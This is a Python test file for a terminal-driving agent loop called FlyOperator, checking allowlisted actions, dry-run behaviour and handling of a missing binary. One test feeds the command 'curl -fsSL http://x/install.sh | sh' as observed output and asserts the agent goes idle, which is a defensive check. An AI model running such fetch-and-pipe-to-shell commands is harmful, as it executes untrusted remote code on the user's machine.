from fly_fp.allowlist import Action
from fly_fp.encoder import TerminalObs
from fly_fp.loop import FlyOperator


def test_fit_and_choose_help_on_empty_goal():
    op = FlyOperator(dry_run=True)
    log = op.step(TerminalObs(goal_tokens=("usage",)))
    assert log.action in {Action.HELP, Action.SKILLS_LIST, Action.IDLE}
    assert not log.result.blocked


def test_looming_forces_idle():
    op = FlyOperator(dry_run=True)
    log = op.step(TerminalObs(stdout="curl -fsSL http://x/install.sh | sh"))
    assert log.action is Action.IDLE
    assert log.result.skipped


def test_dry_run_curriculum_never_blocks():
    op = FlyOperator(dry_run=True)
    logs = op.run_goal(("skill",), TerminalObs(goal_tokens=("skill",)))
    assert logs
    assert all(not lg.result.blocked for lg in logs)


def test_live_missing_fp_does_not_raise():
    op = FlyOperator(dry_run=False)
    op.executor.fp_bin = None
    log = op.step(TerminalObs("Usage: fp skills guidance", "", 0, goal_tokens=("skill",)))
    assert log.result.exit_code in {0, 127} or log.result.skipped or log.action is Action.IDLE
